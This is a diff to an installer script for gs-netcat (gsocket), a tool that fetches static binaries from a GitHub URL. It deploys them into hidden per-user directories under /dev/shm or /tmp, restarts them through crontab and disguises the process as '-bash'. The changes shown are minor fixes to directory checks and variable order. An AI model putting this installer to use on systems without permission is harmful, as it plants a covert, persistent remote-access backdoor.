@@ -22,7 +22,6 @@
 #
 # Other variables:
 # GS_DEBUG=1
-# 		- Use binaries from ../packaging/gsnc-deploy-bin/
 #		- Verbose output
 #		- Shorter timeout to restart crontab etc
 #       - Often used like this:
@@ -39,6 +38,8 @@
 #		- Use 'path' instead of '/' (needed for packaging/testing)
 # GS_URL_BASE=https://github.com/hackerschoice/binary/raw/main/gsocket/bin/
 #		- Specify URL of static binaries
+# GS_DSTDIR="/tmp/foobar/blah"
+#		- Specify customer installation directory
 
 # Global Defines
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
@@ -97,6 +98,7 @@ exit_alldone()
 try_dstdir()
 {
 	local dstdir
+	local trybin
 	dstdir="${1}"
 
 	# Create directory if it does not exists.
@@ -113,8 +115,18 @@ try_dstdir()
 		ebin=$(command -v id 2>/dev/null)
 		[[ -z "$ebin" ]] && return 0 # Try our best
 	fi
-	cp -a "$ebin" "$DSTBIN" &>/dev/null || return 0
-	"${DSTBIN}" &>/dev/null || { rm -f "${DSTDBIN}"; return 103; } # FAILURE
+
+	# Must use same name on busybox-systems
+	trybin="${dstdir}/$(basename "$ebin")"
+
+	# /bin/true might be a symlink to /usr/bin/true
+	if [[ -f "${trybin}" ]]; then
+		"${trybin}" &>/dev/null || { return 103; } # FAILURE
+	else 
+		cp "$ebin" "$trybin" &>/dev/null || return 0
+		"${trybin}" &>/dev/null || { rm -f "${trybin}"; return 103; } # FAILURE
+		rm -f "${trybin}"
+	fi
 
 	return 0
 }
@@ -200,15 +212,15 @@ init_vars()
 		[[ -z "$OSARCH" ]] && OSARCH="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit
 	fi
 
+	# Docker does not set USER
+	[[ -z "$USER" ]] && USER=$(id -un)
+	[[ -z "$UID" ]] && UID=$(id -u)
+
 	try_tmpdir "/dev/shm" ".gs-${UID}"
 	try_tmpdir "/tmp" ".gs-${UID}"
 	try_tmpdir "${HOME}/.tmp" ".gs-${UID}"
 
 	SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
-
-	# Docker does not set USER
-	[[ -z "$USER" ]] && USER=$(id -un)
-	[[ -z "$UID" ]] && UID=$(id -u)
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not pkill all -bash.
